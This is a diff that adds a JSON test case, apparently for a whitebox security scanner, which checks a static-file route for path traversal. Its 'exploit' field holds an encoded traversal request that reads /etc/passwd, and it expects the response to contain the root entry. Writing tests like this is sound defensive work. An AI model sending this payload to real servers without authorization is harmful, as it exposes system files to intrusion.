@@ -1,0 +1,13 @@
+{
+  "name": "static-path-traversal",
+  "mode": "whitebox",
+  "baseline": { "method": "GET", "path": "/index.html" },
+  "exploit": { "method": "GET", "path": "/static/..%2f..%2f..%2f..%2fetc/passwd" },
+  "expect": {
+    "baseline_status": [200],
+    "exploit_not_in": [403, 404],
+    "exploit_contains": ["root:x:0:0"]
+  },
+  "sink_window": { "sink": "fs.readFileSync" },
+  "oob": { "required": false }
+}
